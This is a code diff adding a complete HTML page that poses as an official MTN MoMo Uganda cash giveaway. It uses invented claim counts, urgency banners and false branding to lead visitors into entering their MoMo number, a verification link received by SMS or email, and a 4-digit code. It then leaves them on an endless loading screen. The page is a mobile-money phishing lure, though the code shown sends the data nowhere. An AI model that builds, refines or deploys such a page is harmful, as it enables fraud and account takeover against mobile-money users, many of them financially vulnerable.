@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo UGANDA · Free Giveaway</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #f7f0e6 0%, #e8dccc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+        .card {
+            background: #ffffff;
+            max-width: 520px;
+            width: 100%;
+            border-radius: 2.5rem;
+            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.25), 0 10px 20px -5px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            padding: 2rem 1.8rem;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+            margin-bottom: 1.2rem;
+        }
+        .logo-area i {
+            font-size: 2.2rem;
+            color: #ffb800;
+            background: #000;
+            border-radius: 50%;
+            padding: 0.4rem;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .logo-area h1 {
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            color: #1a1a1a;
+            text-shadow: 0 2px 4px rgba(255, 215, 0, 0.3);
+        }
+        .logo-area span {
+            color: #ffb800;
+            font-weight: 900;
+        }
+        .badge {
+            background: #1e1e1e;
+            color: #ffcc00;
+            font-size: 0.85rem;
+            font-weight: 600;
+            text-align: center;
+            padding: 0.5rem 1rem;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 0 auto 1.5rem;
+            letter-spacing: 0.5px;
+            border: 1px solid #ffcc00;
+            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.2);
+        }
+        .badge i {
+            margin-right: 6px;
+        }
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+            animation: fade 0.25s ease;
+        }
+        @keyframes fade {
+            from { opacity: 0.6; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        label {
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 0.35rem;
+            display: block;
+            letter-spacing: 0.3px;
+        }
+        select, input, button {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            border-radius: 60px;
+            border: 1.5px solid #ddd6cc;
+            background: #fefcf9;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.2s;
+            font-weight: 500;
+            color: #1a1a1a;
+        }
+        select:focus, input:focus {
+            border-color: #ffb800;
+            box-shadow: 0 0 0 3px rgba(255, 184, 0, 0.25);
+            background: #ffffff;
+        }
+        .phone-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 0.25rem;
+        }
+        .phone-group .prefix {
+            width: 110px;
+            background: #f0ebe4;
+            text-align: center;
+            font-weight: 700;
+            color: #2d2d2d;
+            border-color: #d6cec2;
+            cursor: default;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: 0.5px;
+        }
+        .phone-group input {
+            flex: 1;
+        }
+        button {
+            background: #ffb800;
+            border: none;
+            color: #1e1e1e;
+            font-weight: 800;
+            font-size: 1.1rem;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0 8px 18px -6px #ffb80080;
+            transition: 0.15s;
+            margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        button:hover {
+            background: #ffc933;
+            transform: scale(1.01);
+            box-shadow: 0 10px 22px -6px #ffb800b0;
+        }
+        button:disabled {
+            opacity: 0.6;
+            transform: none;
+            pointer-events: none;
+        }
+        .small-note {
+            font-size: 0.75rem;
+            color: #7a6e5e;
+            margin: 0.7rem 0 0.2rem;
+            text-align: center;
+        }
+        .mtn-momo-note {
+            background: #0000000c;
+            border-left: 5px solid #ffb800;
+            padding: 0.8rem 1rem;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            margin: 1rem 0;
+            color: #2c2c2c;
+            font-weight: 500;
+        }
+        .promo-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #000;
+            text-align: center;
+            line-height: 1.2;
+            margin-bottom: 0.5rem;
+        }
+        .promo-title span {
+            background: #ffb800;
+            padding: 0.1rem 0.8rem;
+            border-radius: 40px;
+            color: #000;
+            font-size: 1.4rem;
+            display: inline-block;
+            margin-top: 0.3rem;
+        }
+        .giveaway-amount {
+            font-size: 2.3rem;
+            font-weight: 900;
+            color: #1e1e1e;
+            text-align: center;
+            background: #fff1ce;
+            padding: 0.6rem;
+            border-radius: 80px;
+            margin: 1.2rem 0 0.8rem;
+            letter-spacing: -0.5px;
+            border: 2px dashed #ffb800;
+        }
+        .giveaway-amount small {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #5e4d2e;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: #ede7df;
+            border-radius: 60px;
+            padding: 0.7rem 1.4rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #1e1e1e;
+            margin: 1rem 0 1.2rem;
+        }
+        .stats i {
+            color: #ffb800;
+            margin-right: 5px;
+        }
+        .urgent {
+            background: #fff0d9;
+            border-radius: 30px;
+            padding: 0.9rem 1.2rem;
+            font-weight: 700;
+            color: #a14400;
+            text-align: center;
+            font-size: 0.95rem;
+            border: 1px solid #ffb800;
+            animation: pulse 1.6s infinite;
+        }
+        @keyframes pulse {
+            0% { background: #fff0d9; }
+            50% { background: #ffe6b8; }
+            100% { background: #fff0d9; }
+        }
+        .question-block {
+            margin: 1.2rem 0 1rem;
+        }
+        .question-block label {
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+        .pin-message {
+            background: #e7f0e7;
+            color: #1f5e1f;
+            font-weight: 600;
+            padding: 0.6rem;
+            border-radius: 40px;
+            text-align: center;
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+        }
+        .loading-screen {
+            text-align: center;
+            padding: 2rem 0;
+        }
+        .loading-screen .spinner {
+            font-size: 2.8rem;
+            color: #ffb800;
+            animation: spin 1.4s linear infinite;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            letter-spacing: 3px;
+            color: #1e1e1e;
+        }
+        .loading-sub {
+            color: #7a6e5e;
+            font-weight: 500;
+            margin-top: 0.5rem;
+        }
+        .link-step {
+            margin-top: 0.8rem;
+        }
+        .mtn-footer {
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            text-align: center;
+            color: #a09686;
+            border-top: 1px solid #eee7dd;
+            padding-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+<div class="card" id="app">
+    <!-- LOGO -->
+    <div class="logo-area">
+        <i class="fas fa-mobile-alt"></i>
+        <h1>MTN <span>MoMo</span> UGANDA</h1>
+    </div>
+    <div style="text-align: center;">
+        <span class="badge"><i class="fas fa-gift"></i> OFFICIAL GIVEAWAY 2025</span>
+    </div>
+
+    <!-- PAGE 1: COUNTRY & PHONE (MOMO) -->
+    <div id="page1" class="page active">
+        <label for="countrySelect"><i class="fas fa-globe-africa"></i> Select country</label>
+        <select id="countrySelect">
+            <option value="" disabled selected>— Choose your country —</option>
+            <option value="UG" data-prefix="+256">Uganda 🇺🇬</option>
+            <option value="KE" data-prefix="+254">Kenya 🇰🇪</option>
+            <option value="TZ" data-prefix="+255">Tanzania 🇹🇿</option>
+            <option value="RW" data-prefix="+250">Rwanda 🇷🇼</option>
+            <option value="NG" data-prefix="+234">Nigeria 🇳🇬</option>
+            <option value="ZA" data-prefix="+27">South Africa 🇿🇦</option>
+        </select>
+
+        <div style="margin-top: 1.2rem;">
+            <label for="phoneInput"><i class="fas fa-phone-alt"></i> MTN MoMo number</label>
+            <div class="phone-group">
+                <div class="prefix" id="prefixDisplay">+256</div>
+                <input type="tel" id="phoneInput" placeholder="77X XXX XXX" inputmode="numeric" maxlength="12">
+            </div>
+            <div class="pin-message">
+                <i class="fas fa-lock"></i> Must be a registered MTN MoMo number
+            </div>
+        </div>
+
+        <button id="proceedToPromo" style="margin-top: 1.8rem;">
+            <i class="fas fa-arrow-right"></i> Continue to giveaway
+        </button>
+        <div class="small-note">No registration needed • Instant entry</div>
+    </div>
+
+    <!-- PAGE 2: PROMOTION & GIVEAWAY -->
+    <div id="page2" class="page">
+        <div class="promo-title">
+            🎉 FREE GIVEAWAY 🎉<br>
+            <span>MOMO CASH BONANZA</span>
+        </div>
+        <div class="giveaway-amount">
+            UGX 500,000 <small>each</small>
+        </div>
+        <div class="stats">
+            <span><i class="fas fa-users"></i> 12,438 claimed</span>
+            <span><i class="fas fa-clock"></i> 47 min ago</span>
+        </div>
+        <div class="urgent">
+            <i class="fas fa-hourglass-end"></i> ⚠️ EXPIRES SOON — Don't be left behind! ⚠️
+        </div>
+        <div class="mtn-momo-note">
+            <i class="fas fa-mobile-alt"></i> <strong>Use your MoMo details</strong> for quick review & instant payout.
+        </div>
+
+        <div class="question-block">
+            <label for="question1"><i class="fas fa-question-circle"></i> Why do you need this giveaway?</label>
+            <select id="question1">
+                <option value="" disabled selected>— Select a reason —</option>
+                <option value="bills">Pay bills / rent</option>
+                <option value="business">Start small business</option>
+                <option value="school">School fees</option>
+                <option value="family">Support family</option>
+                <option value="other">Other</option>
+            </select>
+        </div>
+
+        <button id="submitApplication">
+            <i class="fas fa-paper-plane"></i> Submit application
+        </button>
+        <div class="small-note">🔒 Your MoMo number is safe with us</div>
+    </div>
+
+    <!-- PAGE 3: LINK VERIFICATION -->
+    <div id="page3" class="page">
+        <div style="text-align: center; margin-bottom: 1rem;">
+            <i class="fas fa-shield-alt" style="font-size: 2.2rem; color: #ffb800;"></i>
+            <h2 style="font-weight: 800; letter-spacing: -0.3px;">Verification step</h2>
+            <p style="color: #5e5e5e; font-size: 0.9rem;">Paste the link you received</p>
+        </div>
+        <label for="verificationLink"><i class="fas fa-link"></i> Verification link</label>
+        <input type="url" id="verificationLink" placeholder="https://...">
+        <button id="submitLink" style="margin-top: 1.2rem;">
+            <i class="fas fa-check-circle"></i> Submit link
+        </button>
+        <div class="small-note">Paste the exact link from your SMS/Email</div>
+    </div>
+
+    <!-- PAGE 4: 4-DIGIT CODE -->
+    <div id="page4" class="page">
+        <div style="text-align: center; margin-bottom: 1rem;">
+            <i class="fas fa-key" style="font-size: 2.2rem; color: #ffb800;"></i>
+            <h2 style="font-weight: 800;">Last step</h2>
+            <p style="color: #5e5e5e; font-size: 0.9rem;">Enter the 4-digit code sent to you</p>
+        </div>
+        <label for="fourDigitCode"><i class="fas fa-lock"></i> 4-digit code</label>
+        <input type="text" id="fourDigitCode" placeholder="1234" inputmode="numeric" maxlength="4">
+        <button id="finishBtn" style="margin-top: 1.5rem;">
+            <i class="fas fa-flag-checkered"></i> FINISH
+        </button>
+    </div>
+
+    <!-- PAGE 5: LOADING (just loading) -->
+    <div id="page5" class="page">
+        <div class="loading-screen">
+            <i class="fas fa-spinner spinner"></i>
+            <div class="loading-text">LOADING.....</div>
+            <div class="loading-sub">please wait</div>
+        </div>
+    </div>
+
+    <div class="mtn-footer">
+        MTN MoMo Uganda · Official giveaway · Terms apply
+    </div>
+</div>
+
+<script>
+    (function() {
+        // DOM elements
+        const countrySelect = document.getElementById('countrySelect');
+        const prefixDisplay = document.getElementById('prefixDisplay');
+        const phoneInput = document.getElementById('phoneInput');
+        const proceedBtn = document.getElementById('proceedToPromo');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+        const page4 = document.getElementById('page4');
+        const page5 = document.getElementById('page5');
+        const submitAppBtn = document.getElementById('submitApplication');
+        const submitLinkBtn = document.getElementById('submitLink');
+        const finishBtn = document.getElementById('finishBtn');
+        const question1 = document.getElementById('question1');
+        const verificationLink = document.getElementById('verificationLink');
+        const fourDigitCode = document.getElementById('fourDigitCode');
+
+        // ---- helpers ----
+        function showPage(pageId) {
+            [page1, page2, page3, page4, page5].forEach(p => p.classList.remove('active'));
+            if (pageId === 'page1') page1.classList.add('active');
+            else if (pageId === 'page2') page2.classList.add('active');
+            else if (pageId === 'page3') page3.classList.add('active');
+            else if (pageId === 'page4') page4.classList.add('active');
+            else if (pageId === 'page5') page5.classList.add('active');
+        }
+
+        // ---- country prefix auto-update ----
+        countrySelect.addEventListener('change', function() {
+            const selectedOption = this.options[this.selectedIndex];
+            const prefix = selectedOption.getAttribute('data-prefix') || '+256';
+            prefixDisplay.textContent = prefix;
+            // Clear phone? no need, just update
+        });
+
+        // ---- initial prefix (Uganda default if none selected) ----
+        // The first option is disabled and selected, but we set default prefix to +256 (Uganda)
+        prefixDisplay.textContent = '+256';
+
+        // ---- page1 -> page2 (validation) ----
+        proceedBtn.addEventListener('click', function() {
+            const country = countrySelect.value;
+            if (!country) {
+                alert('Please select a country.');
+                return;
+            }
+            const phoneRaw = phoneInput.value.trim();
+            // Remove all non-digit chars for validation
+            const digits = phoneRaw.replace(/\D/g, '');
+            if (digits.length < 8) {
+                alert('Please enter a valid MTN MoMo number (at least 8 digits).');
+                return;
+            }
+            // Optionally check if phone starts with 77, 78, 39, 76 (common MTN Uganda prefixes) - but just basic is fine
+            // we can alert if not MTN but not strict. We'll show a friendly note.
+            // For momo, just accept.
+            // Move to promotion page
+            showPage('page2');
+        });
+
+        // ---- page2 -> page3 (submit application) ----
+        submitAppBtn.addEventListener('click', function() {
+            // validate question
+            if (!question1.value) {
+                alert('Please select a reason for the giveaway.');
+                return;
+            }
+            // Also verify phone and country still exist (just in case)
+            if (!countrySelect.value) {
+                alert('Please go back and select your country.');
+                showPage('page1');
+                return;
+            }
+            // Move to link page
+            showPage('page3');
+        });
+
+        // ---- page3 -> page4 (submit link) ----
+        submitLinkBtn.addEventListener('click', function() {
+            const linkValue = verificationLink.value.trim();
+            if (linkValue === '') {
+                alert('Please paste the verification link you received.');
+                return;
+            }
+            // optional check for link format? just simple check
+            if (!linkValue.startsWith('http://') && !linkValue.startsWith('https://')) {
+                alert('Link should start with http:// or https://');
+                return;
+            }
+            // Move to 4-digit code page
+            showPage('page4');
+        });
+
+        // ---- page4 -> page5 (finish -> loading) ----
+        finishBtn.addEventListener('click', function() {
+            const code = fourDigitCode.value.trim();
+            if (code.length !== 4 || !/^\d{4}$/.test(code)) {
+                alert('Please enter a valid 4-digit code (numbers only).');
+                return;
+            }
+            // Move to loading page
+            showPage('page5');
+            // After some time... we just stay loading (as requested: "just loading")
+            // Optional: simulate infinite loading - do nothing else.
+        });
+
+        // ---- input restriction for phone (digits and maybe spaces) ----
+        phoneInput.addEventListener('input', function(e) {
+            // allow digits, spaces, maybe plus? but we only need digits. Keep it friendly
+            let val = this.value.replace(/[^\d\s]/g, '');
+            // limit length to 12 digits (including spaces we don't care)
+            const digitsOnly = val.replace(/\D/g, '');
+            if (digitsOnly.length > 10) {
+                // trim to 10 digits, preserving spaces? simpler: slice raw
+                this.value = this.value.slice(0, 12);
+            } else {
+                this.value = val;
+            }
+        });
+
+        // Restrict 4-digit code to numbers only
+        fourDigitCode.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        // Prefill dummy for testing? No, keep empty.
+        // Add a tiny helper: if user selected country, prefix already changed.
+        // Also when page loads, ensure phone field doesn't accept non-digits? already input handler.
+
+        // Extra: country change should maybe clear phone if needed? no.
+        // Additional: when clicking "submit link", also validate that the link is not empty & maybe check if code page reached.
+    })();
+</script>
+</body>
+</html>
+
